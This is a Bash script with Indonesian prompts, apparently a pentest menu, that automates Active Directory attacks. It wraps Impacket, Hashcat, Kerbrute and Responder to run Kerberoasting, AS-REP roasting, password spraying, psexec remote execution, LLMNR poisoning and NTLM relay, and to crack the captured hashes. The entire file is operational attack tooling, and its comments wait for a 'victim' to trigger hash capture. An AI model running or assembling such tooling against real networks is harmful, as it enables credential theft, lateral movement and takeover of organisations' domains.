#!/bin/bash

# Path ke direktori impacket kamu
IMPACKET_PATH="/home/kali/Documents/impacket-0.9.21/examples"

function kerberoasting_attack() {
    echo "===== Kerberoasting Attack ====="
    read -p "Masukkan DOMAIN (ex: lab.local): " domain
    read -p "Masukkan Username: " username
    read -s -p "Masukkan Password: " password
    echo
    read -p "Masukkan IP Domain Controller: " dc_ip

    echo "[*] Menjalankan kerberoasting menggunakan Impacket..."
    echo
    python3 "$IMPACKET_PATH/GetUserSPNs.py" ${domain}/${username}:${password} -dc-ip $dc_ip -request

    echo
    read -p "Tekan Enter untuk kembali ke menu..."
}

function detect_hash_type() {
    hash_line=$(head -n 1 "$1")
    if [[ "$hash_line" == *"\$krb5tgs\$23\$"* ]]; then
        echo "kerberoasting"
    elif [[ "$hash_line" == *"\$krb5asrep\$23\$"* ]]; then
        echo "asrep"
    else
        echo "unknown"
    fi
}

function crack_hash() {
    echo "===== Crack Hash (Hashcat) ====="
    read -p "Masukkan path file hash (misal: hash.hash): " hash_file
    read -p "Masukkan path wordlist (default: /usr/share/wordlists/rockyou.txt): " wordlist

    if [ -z "$wordlist" ]; then
        wordlist="/usr/share/wordlists/rockyou.txt"
    fi

    if [ ! -f "$hash_file" ]; then
        echo "[-] File hash tidak ditemukan!"
        read -p "Tekan Enter untuk kembali ke menu..."
        return
    fi

    hash_type=$(detect_hash_type "$hash_file")

    if [ "$hash_type" == "kerberoasting" ]; then
        echo "[*] Deteksi: Kerberoasting Hash (krb5tgs) - Menggunakan mode -m 13100"
        hashcat -m 13100 "$hash_file" "$wordlist" --force
    elif [ "$hash_type" == "asrep" ]; then
        echo "[*] Deteksi: AS-REP Roasting Hash (krb5asrep) - Menggunakan mode -m 18200"
        hashcat -m 18200 "$hash_file" "$wordlist" --force
    else
        echo "[!] Format hash tidak dikenali. Pastikan hash valid dan didukung."
        read -p "Tekan Enter untuk kembali ke menu..."
        return
    fi

    echo
    echo "[+] Password yang berhasil ditemukan:"
    hashcat -m 13100 "$hash_file" --show 2>/dev/null
    echo
    read -p "Tekan Enter untuk kembali ke menu..."
}

function asrep_roasting_attack() {
    echo "===== AS-REP Roasting Attack ====="
    echo "1. Gunakan credential (user + password)"
    echo "2. Gunakan list user (user.txt)"
    read -p "Pilih mode (1/2): " mode

    read -p "Masukkan DOMAIN (ex: lab.local): " domain
    read -p "Masukkan IP Domain Controller: " dc_ip

    if [ "$mode" == "1" ]; then
        read -p "Masukkan Username: " username
        read -s -p "Masukkan Password: " password
        echo

        echo "[*] Menjalankan AS-REP Roasting dengan credential..."
        python3 "$IMPACKET_PATH/GetNPUsers.py" "${domain}/${username}:${password}" -dc-ip $dc_ip -request

    elif [ "$mode" == "2" ]; then
        read -p "Masukkan path ke file user list (default: user.txt): " userlist
        if [ -z "$userlist" ]; then
            userlist="user.txt"
        fi

        if [ ! -f "$userlist" ]; then
            echo "[-] File user list tidak ditemukan!"
            read -p "Tekan Enter untuk kembali ke menu..."
            return
        fi

        echo "[*] Menjalankan AS-REP Roasting dengan user list..."
        python3 "$IMPACKET_PATH/GetNPUsers.py" "${domain}/" -usersfile "$userlist" -dc-ip $dc_ip -no-pass
    else
        echo "[-] Pilihan tidak valid!"
    fi

    echo
    read -p "Tekan Enter untuk kembali ke menu..."
}

function password_spraying() {
    echo "===== Password Spraying (Kerbrute) ====="
    echo "1. Enumerasi user (userenum)"
    echo "2. Bruteforce 1 password untuk banyak user"
    read -p "Pilih mode (1-2): " mode

    read -p "Masukkan DOMAIN (ex: lab.local): " domain
    read -p "Masukkan IP Domain Controller: " dc_ip

    kerbrute_path="/home/kali/Documents/kerbrute_linux_amd64"
    rockyou_path="/usr/share/wordlists/rockyou.txt"

    if [ ! -f "$kerbrute_path" ]; then
        echo "[-] Kerbrute binary tidak ditemukan di $kerbrute_path"
        read -p "Tekan Enter untuk kembali ke menu..."
        return
    fi

    case $mode in
        1)
            read -p "Masukkan path ke file user list (default: users.txt): " userlist
            [ -z "$userlist" ] && userlist="users.txt"

            if [ ! -f "$userlist" ]; then
                echo "[-] File user list tidak ditemukan!"
                read -p "Tekan Enter untuk kembali ke menu..."
                return
            fi

            echo "[*] Menjalankan user enumeration..."
            $kerbrute_path userenum -d "$domain" --dc "$dc_ip" "$userlist"
            ;;

        2)
            read -p "Masukkan path ke file user list (default: users.txt): " userlist
            [ -z "$userlist" ] && userlist="users.txt"

            read -p "Masukkan password yang ingin digunakan: " password

            if [ ! -f "$userlist" ]; then
                echo "[-] File user list tidak ditemukan!"
                read -p "Tekan Enter untuk kembali ke menu..."
                return
            fi

            echo "[*] Menjalankan spraying dengan 1 password untuk banyak user..."
            $kerbrute_path passwordspray -d "$domain" --dc "$dc_ip" "$userlist" "$password"
            ;;
    esac

    echo
    read -p "Tekan Enter untuk kembali ke menu..."
}

function pass_the_password() {
    echo "===== Pass-the-Password Attack ====="
    read -p "Masukkan DOMAIN (ex: lab.local): " domain
    read -p "Masukkan Username: " username
    read -s -p "Masukkan Password: " password
    echo
    read -p "Masukkan IP Target: " ip

    echo "[*] Menjalankan Pass-the-Password menggunakan psexec.py..."
    python3 "$IMPACKET_PATH/psexec.py" "${domain}/${username}:${password}@${ip}"
    echo
    read -p "Tekan Enter untuk kembali ke menu..."
}


llmnr_attack() {
    # Ganti dengan interface yang kamu pakai
    INTERFACE="eth0"

    # Path ke folder Responder
    RESPONDER_DIR="/home/kali/Documents/Responder-2.3.3.9"

    # Cek apakah Responder ada
    if [ ! -f "$RESPONDER_DIR/Responder.py" ]; then
        echo "[!] Responder.py tidak ditemukan di $RESPONDER_DIR"
        return 1
    fi

    # Masuk ke folder Responder
    cd "$RESPONDER_DIR" || return 1

    # Jalankan Responder di terminal baru
    echo "[*] Menjalankan Responder di interface: $INTERFACE"
    x-terminal-emulator -e "sudo python2 Responder.py -I $INTERFACE -rdwv"

    # Tunggu korban mengetik sesuatu
    read -p "[*] Tekan ENTER setelah korban mengetik di File Explorer atau hash muncul..."

    # Cek hash di folder logs
    echo "[*] Melihat isi folder logs:"
    ls -l logs/

    # Tampilkan hash terakhir jika ada
    LAST_HASH=$(find logs/ -type f -name '*.txt' -exec tail -n 5 {} \; 2>/dev/null)

    if [ -n "$LAST_HASH" ]; then
        echo -e "\n[*] Berikut adalah hash yang tertangkap:\n"
        echo "$LAST_HASH"
    else
        echo "[!] Belum ada hash yang tertangkap."
    fi

    echo
    read -p "Tekan Enter untuk kembali ke menu..."
}

SMB_Attack() {
    read -p "Masukkan IP target SMB relay: " target_ip
    read -p "Masukkan nama interface (default: eth0): " iface
    iface=${iface:-eth0}

    local responder_conf_path="/home/kali/Documents/Responder-2.3.3.9/Responder.conf"
    local responder_path="/home/kali/Documents/Responder-2.3.3.9"
    local ntlmrelayx_path="/home/kali/Documents/impacket/examples"

    echo "[+] Menonaktifkan SMB dan HTTP pada Responder.conf..."
    sed -i 's/^SMB = On/SMB = Off/' "$responder_conf_path"
    sed -i 's/^HTTP = On/HTTP = Off/' "$responder_conf_path"

    echo "[+] Menjalankan Responder di terminal baru..."
    if [ -d "$responder_path" ]; then
        x-terminal-emulator -e "bash -c 'cd \"$responder_path\" && sudo python2 Responder.py -I \"$iface\" -dwv; exec bash'" &
        sleep 2
    else
        echo "[-] Path Responder tidak ditemukan: $responder_path"
        return
    fi

    echo "[+] Menjalankan ntlmrelayx di terminal ini..."
    if [ -d "$ntlmrelayx_path" ]; then
        cd "$ntlmrelayx_path" || return
        sudo python3 ntlmrelayx.py -t smb://$target_ip -smb2support
    else
        echo "[-] Path ntlmrelayx tidak ditemukan: $ntlmrelayx_path"
    fi

    echo "[*] Serangan selesai. Mengaktifkan kembali SMB dan HTTP..."
    sed -i 's/^SMB = Off/SMB = On/' "$responder_conf_path"
    sed -i 's/^HTTP = Off/HTTP = On/' "$responder_conf_path"
    echo "[+] Konfigurasi Responder dikembalikan!"

    echo
    read -p "Tekan Enter untuk kembali ke menu..."
}





while true; do
    clear
    echo "========== MENU SERANGAN =========="
    echo "1. Kerberoasting"
    echo "2. Crack Hash"
    echo "3. AS-REP Roasting"
    echo "4. Password Spraying"
    echo "5. Pass-the-Password"
    echo "6. LLMNR-Attack"
    echo "7. SMB-Attack"
    echo "8. exit"
    echo "==================================="
    read -p "Pilih nomor menu: " choice

    case $choice in
        1)
            kerberoasting_attack
            ;;
        2)
            crack_hash
            ;;
        3)
            asrep_roasting_attack
            ;;

        4)
            password_spraying
            ;;

        5)
            pass_the_password
            ;;

        6)
            llmnr_attack
            ;;

        7)
            SMB_Attack
            ;;
        8)
            echo "Keluar..."
            exit 0
            ;;
        *)
            echo "Pilihan tidak valid. Coba lagi."
            sleep 1
            ;;
    esac
done
